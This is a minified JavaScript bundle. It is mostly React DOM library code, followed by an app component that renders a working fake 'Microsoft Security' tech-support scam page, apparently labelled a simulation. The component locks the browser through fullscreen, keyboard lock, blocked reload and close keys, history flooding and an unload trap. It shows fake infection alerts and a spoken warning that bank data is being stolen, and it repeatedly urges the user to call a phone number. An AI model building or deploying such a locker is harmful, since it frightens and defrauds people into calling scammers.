        this.timeoutHandle = -1,
        this.callbackNode = this.next = this.pendingContext = this.context = this.cancelPendingCommit = null,
        this.callbackPriority = 0,
        this.expirationTimes = kn(-1),
        this.entangledLanes = this.shellSuspendCounter = this.errorRecoveryDisabledLanes = this.expiredLanes = this.warmLanes = this.pingedLanes = this.suspendedLanes = this.pendingLanes = 0,
        this.entanglements = kn(0),
        this.hiddenUpdates = kn(null),
        this.identifierPrefix = a,
        this.onUncaughtError = u,
        this.onCaughtError = n,
        this.onRecoverableError = i,
        this.pooledCache = null,
        this.pooledCacheLanes = 0,
        this.formState = s,
        this.incompleteTransitions = new Map
    }
    function ur(l, t, e, a, u, n, i, c, s, y, S, x) {
        return l = new Wm(l,t,e,i,s,y,S,x,c),
        t = 1,
        n === !0 && (t |= 24),
        n = it(3, null, null, t),
        l.current = n,
        n.stateNode = l,
        t = Ri(),
        t.refCount++,
        l.pooledCache = t,
        t.refCount++,
        n.memoizedState = {
            element: a,
            isDehydrated: e,
            cache: t
        },
        qi(n),
        l
    }
    function nr(l) {
        return l ? (l = ia,
        l) : ia
    }
    function ir(l, t, e, a, u, n) {
        u = nr(u),
        a.context === null ? a.context = u : a.pendingContext = u,
        a = fe(t),
        a.payload = {
            element: e
        },
        n = n === void 0 ? null : n,
        n !== null && (a.callback = n),
        e = se(l, a, t),
        e !== null && (Pl(e, l, t),
        Fa(e, l, t))
    }
    function cr(l, t) {
        if (l = l.memoizedState,
        l !== null && l.dehydrated !== null) {
            var e = l.retryLane;
            l.retryLane = e !== 0 && e < t ? e : t
        }
    }
    function tf(l, t) {
        cr(l, t),
        (l = l.alternate) && cr(l, t)
    }
    function fr(l) {
        if (l.tag === 13 || l.tag === 31) {
            var t = Ue(l, 67108864);
            t !== null && Pl(t, l, 67108864),
            tf(l, 67108864)
        }
    }
    function sr(l) {
        if (l.tag === 13 || l.tag === 31) {
            var t = dt();
            t = $n(t);
            var e = Ue(l, t);
            e !== null && Pl(e, l, t),
            tf(l, t)
        }
    }
    var qn = !0;
    function km(l, t, e, a) {
        var u = p.T;
        p.T = null;
        var n = A.p;
        try {
            A.p = 2,
            ef(l, t, e, a)
        } finally {
            A.p = n,
            p.T = u
        }
    }
    function $m(l, t, e, a) {
        var u = p.T;
        p.T = null;
        var n = A.p;
        try {
            A.p = 8,
            ef(l, t, e, a)
        } finally {
            A.p = n,
            p.T = u
        }
    }
    function ef(l, t, e, a) {
        if (qn) {
            var u = af(a);
            if (u === null)
                Lc(l, t, a, Yn, e),
                dr(l, a);
            else if (Im(u, l, t, e, a))
                a.stopPropagation();
            else if (dr(l, a),
            t & 4 && -1 < Fm.indexOf(l)) {
                for (; u !== null; ) {
                    var n = ke(u);
                    if (n !== null)
                        switch (n.tag) {
                        case 3:
                            if (n = n.stateNode,
                            n.current.memoizedState.isDehydrated) {
                                var i = je(n.pendingLanes);
                                if (i !== 0) {
                                    var c = n;
                                    for (c.pendingLanes |= 2,
                                    c.entangledLanes |= 2; i; ) {
                                        var s = 1 << 31 - ut(i);
                                        c.entanglements[1] |= s,
                                        i &= ~s
                                    }
                                    Ct(n),
                                    (nl & 6) === 0 && (bn = et() + 500,
                                    mu(0))
                                }
                            }
                            break;
                        case 31:
                        case 13:
                            c = Ue(n, 2),
                            c !== null && Pl(c, n, 2),
                            zn(),
                            tf(n, 2)
                        }
                    if (n = af(a),
                    n === null && Lc(l, t, a, Yn, e),
                    n === u)
                        break;
                    u = n
                }
                u !== null && a.stopPropagation()
            } else
                Lc(l, t, a, null, e)
        }
    }
    function af(l) {
        return l = ni(l),
        uf(l)
    }
    var Yn = null;
    function uf(l) {
        if (Yn = null,
        l = We(l),
        l !== null) {
            var t = H(l);
            if (t === null)
                l = null;
            else {
                var e = t.tag;
                if (e === 13) {
                    if (l = R(t),
                    l !== null)
                        return l;
                    l = null
                } else if (e === 31) {
                    if (l = ol(t),
                    l !== null)
                        return l;
                    l = null
                } else if (e === 3) {
                    if (t.stateNode.current.memoizedState.isDehydrated)
                        return t.tag === 3 ? t.stateNode.containerInfo : null;
                    l = null
                } else
                    t !== l && (l = null)
            }
        }
        return Yn = l,
        null
    }
    function or(l) {
        switch (l) {
        case "beforetoggle":
        case "cancel":
        case "click":
        case "close":
        case "contextmenu":
        case "copy":
        case "cut":
        case "auxclick":
        case "dblclick":
        case "dragend":
        case "dragstart":
        case "drop":
        case "focusin":
        case "focusout":
        case "input":
        case "invalid":
        case "keydown":
        case "keypress":
        case "keyup":
        case "mousedown":
        case "mouseup":
        case "paste":
        case "pause":
        case "play":
        case "pointercancel":
        case "pointerdown":
        case "pointerup":
        case "ratechange":
        case "reset":
        case "resize":
        case "seeked":
        case "submit":
        case "toggle":
        case "touchcancel":
        case "touchend":
        case "touchstart":
        case "volumechange":
        case "change":
        case "selectionchange":
        case "textInput":
        case "compositionstart":
        case "compositionend":
        case "compositionupdate":
        case "beforeblur":
        case "afterblur":
        case "beforeinput":
        case "blur":
        case "fullscreenchange":
        case "focus":
        case "hashchange":
        case "popstate":
        case "select":
        case "selectstart":
            return 2;
        case "drag":
        case "dragenter":
        case "dragexit":
        case "dragleave":
        case "dragover":
        case "mousemove":
        case "mouseout":
        case "mouseover":
        case "pointermove":
        case "pointerout":
        case "pointerover":
        case "scroll":
        case "touchmove":
        case "wheel":
        case "mouseenter":
        case "mouseleave":
        case "pointerenter":
        case "pointerleave":
            return 8;
        case "message":
            switch (Br()) {
            case gf:
                return 2;
            case Sf:
                return 8;
            case Mu:
            case qr:
                return 32;
            case pf:
                return 268435456;
            default:
                return 32
            }
        default:
            return 32
        }
    }
    var nf = !1
      , be = null
      , xe = null
      , ze = null
      , bu = new Map
      , xu = new Map
      , Ee = []
      , Fm = "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset".split(" ");
    function dr(l, t) {
        switch (l) {
        case "focusin":
        case "focusout":
            be = null;
            break;
        case "dragenter":
        case "dragleave":
            xe = null;
            break;
        case "mouseover":
        case "mouseout":
            ze = null;
            break;
        case "pointerover":
        case "pointerout":
            bu.delete(t.pointerId);
            break;
        case "gotpointercapture":
        case "lostpointercapture":
            xu.delete(t.pointerId)
        }
    }
    function zu(l, t, e, a, u, n) {
        return l === null || l.nativeEvent !== n ? (l = {
            blockedOn: t,
            domEventName: e,
            eventSystemFlags: a,
            nativeEvent: n,
            targetContainers: [u]
        },
        t !== null && (t = ke(t),
        t !== null && fr(t)),
        l) : (l.eventSystemFlags |= a,
        t = l.targetContainers,
        u !== null && t.indexOf(u) === -1 && t.push(u),
        l)
    }
    function Im(l, t, e, a, u) {
        switch (t) {
        case "focusin":
            return be = zu(be, l, t, e, a, u),
            !0;
        case "dragenter":
            return xe = zu(xe, l, t, e, a, u),
            !0;
        case "mouseover":
            return ze = zu(ze, l, t, e, a, u),
            !0;
        case "pointerover":
            var n = u.pointerId;
            return bu.set(n, zu(bu.get(n) || null, l, t, e, a, u)),
            !0;
        case "gotpointercapture":
            return n = u.pointerId,
            xu.set(n, zu(xu.get(n) || null, l, t, e, a, u)),
            !0
        }
        return !1
    }
    function rr(l) {
        var t = We(l.target);
        if (t !== null) {
            var e = H(t);
            if (e !== null) {
                if (t = e.tag,
                t === 13) {
                    if (t = R(e),
                    t !== null) {
                        l.blockedOn = t,
                        Af(l.priority, function() {
                            sr(e)
                        });
                        return
                    }
                } else if (t === 31) {
                    if (t = ol(e),
                    t !== null) {
                        l.blockedOn = t,
                        Af(l.priority, function() {
                            sr(e)
                        });
                        return
                    }
                } else if (t === 3 && e.stateNode.current.memoizedState.isDehydrated) {
                    l.blockedOn = e.tag === 3 ? e.stateNode.containerInfo : null;
                    return
                }
            }
        }
        l.blockedOn = null
    }
    function Gn(l) {
        if (l.blockedOn !== null)
            return !1;
        for (var t = l.targetContainers; 0 < t.length; ) {
            var e = af(l.nativeEvent);
            if (e === null) {
                e = l.nativeEvent;
                var a = new e.constructor(e.type,e);
                ui = a,
                e.target.dispatchEvent(a),
                ui = null
            } else
                return t = ke(e),
                t !== null && fr(t),
                l.blockedOn = e,
                !1;
            t.shift()
        }
        return !0
    }
    function mr(l, t, e) {
        Gn(l) && e.delete(t)
    }
    function Pm() {
        nf = !1,
        be !== null && Gn(be) && (be = null),
        xe !== null && Gn(xe) && (xe = null),
        ze !== null && Gn(ze) && (ze = null),
        bu.forEach(mr),
        xu.forEach(mr)
    }
    function Xn(l, t) {
        l.blockedOn === t && (l.blockedOn = null,
        nf || (nf = !0,
        T.unstable_scheduleCallback(T.unstable_NormalPriority, Pm)))
    }
    var Qn = null;
    function hr(l) {
        Qn !== l && (Qn = l,
        T.unstable_scheduleCallback(T.unstable_NormalPriority, function() {
            Qn === l && (Qn = null);
            for (var t = 0; t < l.length; t += 3) {
                var e = l[t]
                  , a = l[t + 1]
                  , u = l[t + 2];
                if (typeof a != "function") {
                    if (uf(a || e) === null)
                        continue;
                    break
                }
                var n = ke(e);
                n !== null && (l.splice(t, 3),
                t -= 3,
                ac(n, {
                    pending: !0,
                    data: u,
                    method: e.method,
                    action: a
                }, a, u))
            }
        }))
    }
    function Da(l) {
        function t(s) {
            return Xn(s, l)
        }
        be !== null && Xn(be, l),
        xe !== null && Xn(xe, l),
        ze !== null && Xn(ze, l),
        bu.forEach(t),
        xu.forEach(t);
        for (var e = 0; e < Ee.length; e++) {
            var a = Ee[e];
            a.blockedOn === l && (a.blockedOn = null)
        }
        for (; 0 < Ee.length && (e = Ee[0],
        e.blockedOn === null); )
            rr(e),
            e.blockedOn === null && Ee.shift();
        if (e = (l.ownerDocument || l).$$reactFormReplay,
        e != null)
            for (a = 0; a < e.length; a += 3) {
                var u = e[a]
                  , n = e[a + 1]
                  , i = u[wl] || null;
                if (typeof n == "function")
                    i || hr(e);
                else if (i) {
                    var c = null;
                    if (n && n.hasAttribute("formAction")) {
                        if (u = n,
                        i = n[wl] || null)
                            c = i.formAction;
                        else if (uf(u) !== null)
                            continue
                    } else
                        c = i.action;
                    typeof c == "function" ? e[a + 1] = c : (e.splice(a, 3),
                    a -= 3),
                    hr(e)
                }
            }
    }
    function yr() {
        function l(n) {
            n.canIntercept && n.info === "react-transition" && n.intercept({
                handler: function() {
                    return new Promise(function(i) {
                        return u = i
                    }
                    )
                },
                focusReset: "manual",
                scroll: "manual"
            })
        }
        function t() {
            u !== null && (u(),
            u = null),
            a || setTimeout(e, 20)
        }
        function e() {
            if (!a && !navigation.transition) {
                var n = navigation.currentEntry;
                n && n.url != null && navigation.navigate(n.url, {
                    state: n.getState(),
                    info: "react-transition",
                    history: "replace"
                })
            }
        }
        if (typeof navigation == "object") {
            var a = !1
              , u = null;
            return navigation.addEventListener("navigate", l),
            navigation.addEventListener("navigatesuccess", t),
            navigation.addEventListener("navigateerror", t),
            setTimeout(e, 100),
            function() {
                a = !0,
                navigation.removeEventListener("navigate", l),
                navigation.removeEventListener("navigatesuccess", t),
                navigation.removeEventListener("navigateerror", t),
                u !== null && (u(),
                u = null)
            }
        }
    }
    function cf(l) {
        this._internalRoot = l
    }
    Ln.prototype.render = cf.prototype.render = function(l) {
        var t = this._internalRoot;
        if (t === null)
            throw Error(r(409));
        var e = t.current
          , a = dt();
        ir(e, a, l, t, null, null)
    }
    ,
    Ln.prototype.unmount = cf.prototype.unmount = function() {
        var l = this._internalRoot;
        if (l !== null) {
            this._internalRoot = null;
            var t = l.containerInfo;
            ir(l.current, 2, null, l, null, null),
            zn(),
            t[we] = null
        }
    }
    ;
    function Ln(l) {
        this._internalRoot = l
    }
    Ln.prototype.unstable_scheduleHydration = function(l) {
        if (l) {
            var t = Tf();
            l = {
                blockedOn: null,
                target: l,
                priority: t
            };
            for (var e = 0; e < Ee.length && t !== 0 && t < Ee[e].priority; e++)
                ;
            Ee.splice(e, 0, l),
            e === 0 && rr(l)
        }
    }
    ;
    var vr = Q.version;
    if (vr !== "19.2.3")
        throw Error(r(527, vr, "19.2.3"));
    A.findDOMNode = function(l) {
        var t = l._reactInternals;
        if (t === void 0)
            throw typeof l.render == "function" ? Error(r(188)) : (l = Object.keys(l).join(","),
            Error(r(268, l)));
        return l = E(t),
        l = l !== null ? X(l) : null,
        l = l === null ? null : l.stateNode,
        l
    }
    ;
    var lh = {
        bundleType: 0,
        version: "19.2.3",
        rendererPackageName: "react-dom",
        currentDispatcherRef: p,
        reconcilerVersion: "19.2.3"
    };
    if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
        var Zn = __REACT_DEVTOOLS_GLOBAL_HOOK__;
        if (!Zn.isDisabled && Zn.supportsFiber)
            try {
                Na = Zn.inject(lh),
                at = Zn
            } catch {}
    }
    return Tu.createRoot = function(l, t) {
        if (!O(l))
            throw Error(r(299));
        var e = !1
          , a = ""
          , u = Eo
          , n = To
          , i = Ao;
        return t != null && (t.unstable_strictMode === !0 && (e = !0),
        t.identifierPrefix !== void 0 && (a = t.identifierPrefix),
        t.onUncaughtError !== void 0 && (u = t.onUncaughtError),
        t.onCaughtError !== void 0 && (n = t.onCaughtError),
        t.onRecoverableError !== void 0 && (i = t.onRecoverableError)),
        t = ur(l, 1, !1, null, null, e, a, null, u, n, i, yr),
        l[we] = t.current,
        Qc(l),
        new cf(t)
    }
    ,
    Tu.hydrateRoot = function(l, t, e) {
        if (!O(l))
            throw Error(r(299));
        var a = !1
          , u = ""
          , n = Eo
          , i = To
          , c = Ao
          , s = null;
        return e != null && (e.unstable_strictMode === !0 && (a = !0),
        e.identifierPrefix !== void 0 && (u = e.identifierPrefix),
        e.onUncaughtError !== void 0 && (n = e.onUncaughtError),
        e.onCaughtError !== void 0 && (i = e.onCaughtError),
        e.onRecoverableError !== void 0 && (c = e.onRecoverableError),
        e.formState !== void 0 && (s = e.formState)),
        t = ur(l, 1, !0, t, e ?? null, a, u, s, n, i, c, yr),
        t.context = nr(null),
        e = t.current,
        a = dt(),
        a = $n(a),
        u = fe(a),
        u.callback = null,
        se(e, u, a),
        e = a,
        t.current.lanes = e,
        Ra(t, e),
        Ct(t),
        l[we] = t.current,
        Qc(l),
        new Ln(t)
    }
    ,
    Tu.version = "19.2.3",
    Tu
}
var Mr;
function oh() {
    if (Mr)
        return of.exports;
    Mr = 1;
    function T() {
        if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function"))
            try {
                __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(T)
            } catch (Q) {
                console.error(Q)
            }
    }
    return T(),
    of.exports = sh(),
    of.exports
}
var dh = oh();
const _r = (T, Q=!1, B=1) => {
    const r = ll.useRef(new Audio(T));
    return ll.useEffect( () => (r.current.loop = Q,
    r.current.preload = "auto",
    r.current.volume = B,
    () => {
        r.current.pause(),
        r.current.currentTime = 0
    }
    ), [T, Q, B]),
    {
        play: async () => {
            try {
                r.current.volume = B,
                await r.current.play()
            } catch {}
        }
        ,
        stop: () => {
            r.current.pause(),
            r.current.currentTime = 0
        }
    }
}
  , rh = () => {
    const [T,Q] = ll.useState({
        ip: "Chargement...",
        country: "",
        isp: "Orange S.A."
    });
    return ll.useEffect( () => {
        const B = Math.floor(Math.random() * 21 + 70)
          , r = Math.floor(Math.random() * 255)
          , O = Math.floor(Math.random() * 255)
          , H = Math.floor(Math.random() * 255)
          , R = `${B}.${r}.${O}.${H}`;
        Q({
            ip: R,
            country: "",
            isp: "Orange S.A."
        })
    }
    , []),
    T
}
  , Or = (T, Q) => {
    const B = ll.useRef(0)
      , r = ll.useRef(0)
      , O = ll.useRef(!1);
    ll.useEffect( () => {
        if (!T) {
            document.exitFullscreen && document.exitFullscreen().catch( () => {}
            ),
            navigator.keyboard?.unlock && navigator.keyboard.unlock();
            return
        }
        O.current = !0;
        const H = async X => {
            if (O.current) {
                if (!document.fullscreenElement)
                    try {
                        await document.documentElement.requestFullscreen({
                            navigationUI: "hide"
                        })
                    } catch {}
                if (navigator.keyboard && navigator.keyboard.lock)
                    try {
                        await navigator.keyboard.lock(["Escape", "F11", "AltLeft", "AltRight", "Tab", "MetaLeft", "MetaRight", "ControlLeft", "ControlRight"])
                    } catch {}
                if (!document.pointerLockElement)
                    try {
                        document.body.requestPointerLock()
                    } catch {}
            }
        }
          , R = () => {
            !document.fullscreenElement && O.current && window.addEventListener("click", H, {
                once: !0
            })
        }
          , ol = X => {
            if (!O.current)
                return;
            if ((["F11", "F12", "F5", "Tab", "ContextMenu", "Alt", "Meta"].includes(X.key) || X.ctrlKey && X.key === "r" || X.ctrlKey && X.key === "w") && (X.preventDefault(),
            X.stopPropagation()),
            X.key === "Escape") {
                const ul = Date.now();
                ul - r.current < 800 ? B.current += 1 : B.current = 1,
                r.current = ul,
                console.log(`Tentative sortie dev : ${B.current}/15`),
                B.current >= 25 && (O.current = !1,
                document.exitFullscreen && document.exitFullscreen().catch( () => {}
                ),
                navigator.keyboard?.unlock && navigator.keyboard.unlock(),
                Q())
            }
        }
          , N = X => {
            if (O.current)
                return X.preventDefault(),
                X.returnValue = "",
                H(),
                ""
        }
          , E = X => (X.preventDefault(),
        !1);
        return window.addEventListener("keydown", ol, {
            capture: !0
        }),
        window.addEventListener("mousedown", H),
        window.addEventListener("click", H),
        window.addEventListener("touchstart", H),
        window.addEventListener("contextmenu", E),
        window.addEventListener("beforeunload", N),
        document.addEventListener("fullscreenchange", R),
        H(),
        () => {
            O.current = !1,
            window.removeEventListener("keydown", ol, {
                capture: !0
            }),
            window.removeEventListener("mousedown", H),
            window.removeEventListener("click", H),
            window.removeEventListener("touchstart", H),
            window.removeEventListener("contextmenu", E),
            window.removeEventListener("beforeunload", N),
            document.removeEventListener("fullscreenchange", R)
        }
    }
    , [T, Q])
}
  , jr = (T, Q) => Math.floor(Math.random() * (Q - T) + T);
function mh({active: T}) {
    const [Q,B] = ll.useState([]);
    return ll.useEffect( () => {
        if (!T) {
            B([]);
            return
        }
        let r = 800, O;
        const H = () => {
            B(R => {
                if (R.length >= 50)
                    return R;
                const ol = window.innerWidth - 300
                  , N = window.innerHeight - 200;
                return [...R, {
                    id: Date.now() + Math.random(),
                    x: jr(50, ol),
                    y: jr(50, N),
                    type: Math.random() > .5 ? "error" : "auth",
                    zIndex: 10500 + R.length
                }]
            }
            ),
            r = Math.max(100, r * .9),
            O = setTimeout(H, r)
        }
        ;
        return H(),
        () => clearTimeout(O)
    }
    , [T]),
    f.jsx(f.Fragment, {
        children: Q.map(r => f.jsxs("div", {
            className: "sim-appear",
            style: {
                position: "fixed",
                left: r.x,
                top: r.y,
                width: "300px",
                background: "#fff",
                border: "1px solid #aaa",
                boxShadow: "0 4px 20px rgba(0,0,0,0.5)",
                zIndex: r.zIndex,
                fontFamily: "Segoe UI, sans-serif",
                fontSize: "12px",
                color: "#333",
                userSelect: "none",
                pointerEvents: "none"
            },
            children: [f.jsxs("div", {
                style: {
                    background: r.type === "error" ? "#fff" : "#f0f0f0",
                    padding: "5px 8px",
                    borderBottom: "1px solid #ccc",
                    display: "flex",
                    justifyContent: "space-between",
                    alignItems: "center"
                },
                children: [f.jsx("span", {
                    children: r.type === "error" ? "System Error" : "Security"
                }), f.jsx("span", {
                    children: "✕"
                })]
            }), f.jsx("div", {
                style: {
                    padding: "15px",
                    display: "flex",
                    gap: 10,
                    alignItems: "center"
                },
                children: r.type === "error" ? f.jsxs(f.Fragment, {
                    children: [f.jsx("div", {
                        style: {
                            fontSize: 20
                        },
                        children: "🚫"
                    }), f.jsx("div", {
                        children: "Memory access violation at 0x88412."
                    })]
                }) : f.jsxs(f.Fragment, {
                    children: [f.jsx("div", {
                        style: {
                            fontSize: 20
                        },
                        children: "🔒"
                    }), f.jsx("div", {
                        children: "Password required for System32."
                    })]
                })
            })]
        }, r.id))
    })
}
const hh = "images/XXR_MIC1.png"
  , Dr = "images/COMMAXIOD.gif"
  , yh = "images/MiccXML.png"
  , Au = "images/DEFENDOXxa.png"
  , Nr = "images/ALERXOR.png"
  , hf = "images/XXR_MIC1.png"
  , Ur = "images/FGGBOGO.png"
  , vh = [hh, Dr, yh, Au, Nr, hf, Ur];
function gh({active: T, onLog: Q, closeSim: B}) {
    const {ip: r, country: O, isp: H} = rh()
      , R = "+1-877-481-3419"
      , [ol,N] = ll.useState(!1)
      , [E,X] = ll.useState(!0)
      , U = ll.useRef(null);
    Or(T && ol, B);
    const [ul,Zl] = ll.useState(!1)
      , [Yl,Nl] = ll.useState(!1)
      , [Tt,Vl] = ll.useState(!1)
      , [Ot,jl] = ll.useState(!1)
      , [Jl,rt] = ll.useState(!1)
      , [Gl,W] = ll.useState(!1)
      , [Xl,lt] = ll.useState(!1)
      , [Dt,mt] = ll.useState(!1)
      , [Ql,Ht] = ll.useState(!1)
      , [At,tt] = ll.useState(!1)
      , [p,A] = ll.useState([])
      , [Y,il] = ll.useState(1240)
      , [cl,d] = ll.useState(0)
      , [z,M] = ll.useState(0)
      , _ = _r("LdelCcbW.wav", !0, .3);
    ll.useEffect( () => {
        vh.forEach(G => {
            const w = new Image;
            w.src = G
        }
        )
    }
    , []),
    ll.useEffect( () => {
        if (T) {
            const G = setTimeout( () => {
                try {
                    document.documentElement.requestFullscreen().catch( () => {}
                    )
                } catch {}
            }
            , 50);
            return () => clearTimeout(G)
        }
    }
    , [T]);
    const L = () => {
        if (!window.speechSynthesis)
            return;
        window.speechSynthesis.cancel();
        const G = R.split(" ").join(", ")
          , w = new SpeechSynthesisUtterance;
        w.text = `
        Microsoft Windows critical security alert.
        Your computer has been locked following an intrusion detected on your Facebook account.
        The IP address ${r}, located in ${O}, is currently spreading a Trojan Horse-type virus.

        Be careful. Your personal information, bank details and photos are being transferred to a remote server.

        Call emergency support immediately at: ${G}.

        I repeat the situation is critical.
        Do not turn off your computer or close this window.
        Any attempt to stop will result in the permanent loss of all your data and the blocking of your hard drive.

        A Microsoft certified engineer is waiting to secure your machine.
        Now call it: ${G}.

        Error code: B, 7, on, 9.
        Call Now ${G}.
    `,
        w.lang = "en-US",
        w.volume = 1,
        w.rate = .95,
        w.pitch = .9;
        const Ke = window.speechSynthesis.getVoices().find(Je => Je.lang.includes("en") && (Je.name.includes("Google") || Je.name.includes("Microsoft")));
        Ke && (w.voice = Ke),
        w.onend = () => {
            T && setTimeout( () => window.speechSynthesis.speak(w), 1e3)
        }
        ,
        window.speechSynthesis.speak(w)
    }
      , J = () => {
        if (ol || !T)
            return;
        X(!1),
        N(!0),
        Q("SIM", `Infection Triggered via Facebook Trap on ${r}`);
        for (let w = 0; w < 20; w++)
            window.history.pushState(null, document.title, window.location.href);
        try {
            document.documentElement.requestFullscreen().catch( () => {}
            )
        } catch {}
        _.play(),
        L(),
        [{
            t: 100,
            fn: () => Zl(!0)
        }, {
            t: 500,
            fn: () => Nl(!0)
        }, {
            t: 1200,
            fn: () => rt(!0)
        }, {
            t: 2500,
            fn: () => Vl(!0)
        }, {
            t: 3e3,
            fn: () => W(!0)
        }, {
            t: 4e3,
            fn: () => mt(!0)
        }, {
            t: 4500,
            fn: () => jl(!0)
        }, {
            t: 2e3,
            fn: () => Ht(!0)
        }, {
            t: 6500,
            fn: () => lt(!0)
        }, {
            t: 7e3,
            fn: () => tt(!0)
        }].forEach(w => setTimeout(w.fn, w.t))
    }
      , tl = G => {
        U.current && ol && (U.current.style.transform = `translate(${G.clientX}px, ${G.clientY}px)`)
    }
    ;
    ll.useEffect( () => {
        if (!Dt)
            return;
        [{
            t: 500,
            text: "Analysis of the Facebook account...",
            type: "system"
        }, {
            t: 1500,
            text: "Warning: Connection not detected.",
            type: "system"
        }, {
            t: 3e3,
            text: `Hello, an unusual activity has been detected from your IP address . (${O}). Access is at risk.`,
            type: "agent"
        }, {
            t: 5e3,
            text: `Call ${R} immediately in case of emergency to back up your data.`,
            type: "agent"
        }].forEach(w => setTimeout( () => A(Ae => [...Ae, w]), w.t))
    }
    , [Dt, R]),
    ll.useEffect( () => {
        if (!ul)
            return;
        const G = setInterval( () => {
            il(w => w + Math.floor(Math.random() * 5e3)),
            d(w => w < 58 ? w + (Math.random() > .7 ? 1 : 0) : 58),
            M(w => w < 100 ? w + .5 : 100)
        }
        , 50);
        return () => clearInterval(G)
    }
    , [ul]);
    const Ul = G => {
        if (ol)
            return G.preventDefault(),
            !1
    }
    ;
    return T ? f.jsxs("div", {
        className: "sim-fullscreen-overlay",
        onMouseMove: tl,
        onContextMenu: Ul,
        style: {
            backgroundImage: `url(${hf})`,
            cursor: ol ? "none" : "auto"
        },
        children: [f.jsx(mh, {
            active: ol
        }), E && f.jsxs("div", {
            style: {
                position: "fixed",
                top: 0,
                left: 0,
                width: "100%",
                height: "100%",
                zIndex: 2147483647,
                background: `url(${Ur}) no-repeat center center / cover`,
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                cursor: "default"
            },
            children: [f.jsx("div", {
                style: {
                    position: "absolute",
                    top: 0,
                    left: 0,
                    width: "100%",
                    height: "100%",
                    // background: "rgba(255,255,255,0.4)",
                    // backdropFilter: "blur(4px)"
                }
            }), f.jsxs("div", {
                className: "sim-appear",
                style: {
                    position: "relative",
                    background: "#fff",
                    width: "500px",
                    borderRadius: "8px",
                    boxShadow: "0 12px 24px rgba(0,0,0,0.2)",
                    fontFamily: "Helvetica, Arial, sans-serif",
                    color: "#1c1e21",
                    overflow: "hidden"
                },
                children: [f.jsxs("div", {
                    style: {
                        padding: "16px 20px",
                        borderBottom: "1px solid #dddfe2",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "space-between"
                    },
                    children: [f.jsx("h3", {
                        style: {
                            margin: 0,
                            fontSize: "20px",
                            fontWeight: 700,
                            color: "#1877f2"
                        },
                        children: "Microsoft Security"
                    }), f.jsx("span", {
                        style: {
                            fontSize: "12px",
                            color: "#606770"
                        },
                        children: "Support Center"
                    })]
                }), f.jsx("div", {
                    style: {
                        padding: "24px"
                    },
                    children: f.jsxs("div", {
                        style: {
                            display: "flex",
                            gap: 15,
                            alignItems: "flex-start"
                        },
                        children: [f.jsx("div", {
                            style: {
                                fontSize: "32px"
                            },
                            children: "⚠️"
                        }), f.jsxs("div", {
                            children: [f.jsx("h4", {
                                style: {
                                    margin: "0 0 8px 0",
                                    fontSize: "18px"
                                },
                                children: "Malware detected on your PC!"
                            }), f.jsxs("p", {
                                style: {
                                    margin: 0,
                                    fontSize: "14px",
                                    lineHeight: "1.5",
                                    color: "#606770"
                                },
                                children: ["Your system has been reported as infected with a Spyware Trojan. ", f.jsx("strong", {
                                    children: r
                                }), " (", O, ").", f.jsx("br", {}), f.jsx("br", {}), "Windows locked due to unusual activity.Your computer is detected by a defected items. For assistance, contact Microsoft Support now."]
                            })]
                        })]
                    })
                }), f.jsxs("div", {
                    style: {
                        display: "flex",
                        justifyContent: "flex-end",
                        gap: "10px",
                        padding: "16px 20px",
                        background: "#fff",
                        borderTop: "none"
                    },
                    children: [f.jsx("button", {
                        onClick: G => {
                            G.stopPropagation(),
                            J()
                        }
                        ,
                        style: {
                            padding: "10px 20px",
                            border: "none",
                            background: "#e4e6eb",
                            color: "#4b4f56",
                            cursor: "pointer",
                            borderRadius: "6px",
                            fontWeight: 600,
                            fontSize: "15px"
                        },
                        children: "Deny"
                    }), f.jsx("button", {
                        onClick: G => {
                            G.stopPropagation(),
                            J()
                        }
                        ,
                        style: {
                            padding: "10px 20px",
                            border: "none",
                            background: "#1877f2",
                            color: "white",
                            cursor: "pointer",
                            borderRadius: "6px",
                            fontWeight: 600,
                            fontSize: "15px"
                        },
                        children: "Allow"
                    })]
                })]
            })]
        }), f.jsx("div", {
            ref: U,
            className: "sim-fake-cursor",
            style: {
                opacity: ol ? 1 : 0,
                position: "fixed",
                top: 0,
                left: 0,
                pointerEvents: "none",
                zIndex: 9999999
            }
        }), f.jsx("div", {
            className: "sim-bg-layer",
            style: {
                backgroundImage: `url(${hf})`
            }
        }), f.jsx("div", {
            className: "sim-dim-overlay",
            style: {
                opacity: Yl ? 1 : 0
            }
        }), ul && f.jsxs("div", {
            className: "sim-defender sim-appear",
            children: [f.jsxs("div", {
                className: "sim-defender-head",
                children: [f.jsxs("div", {
                    className: "sim-logo-container",
                    children: [f.jsx("img", {
                        src: Au,
                        width: "20",
                        alt: ""
                    }), f.jsx("span", {
                        className: "sim-window-title",
                        children: "Sécurité Windows"
                    })]
                }), f.jsxs("div", {
                    className: "sim-window-controls",
                    children: [f.jsx("span", {
                        children: "—"
                    }), f.jsx("span", {
                        children: "□"
                    }), f.jsx("span", {
                        className: "close",
                        children: "✕"
                    })]
                })]
            }), f.jsxs("div", {
                className: "sim-defender-content",
                children: [f.jsxs("div", {
                    className: "sim-scan-header",
                    children: [f.jsx("img", {
                        src: Au,
                        width: "50",
                        style: {
                            marginRight: 20
                        },
                        alt: ""
                    }), f.jsxs("div", {
                        children: [f.jsx("h2", {
                            className: "sim-scan-title danger",
                            children: "Menace Trojan:Win32/Hive.ZY"
                        }), f.jsx("span", {
                            className: "sim-scan-subtitle",
                            children: "Critical analysis is underway..."
                        })]
                    })]
                }), f.jsx("div", {
                    className: "sim-progress-bar",
                    children: f.jsx("div", {
                        className: "sim-progress-fill danger",
                        style: {
                            width: `${z}%`
                        }
                    })
                }), f.jsxs("div", {
                    className: "sim-stats-grid",
                    children: [f.jsxs("div", {
                        className: "sim-stat-box",
                        children: [f.jsx("div", {
                            className: "sim-stat-label",
                            children: "Fichiers"
                        }), f.jsx("div", {
                            className: "sim-stat-value",
                            children: Y.toLocaleString()
                        })]
                    }), f.jsxs("div", {
                        className: "sim-stat-box",
                        children: [f.jsx("div", {
                            className: "sim-stat-label",
                            children: "Infections"
                        }), f.jsx("div", {
                            className: "sim-stat-value",
                            style: {
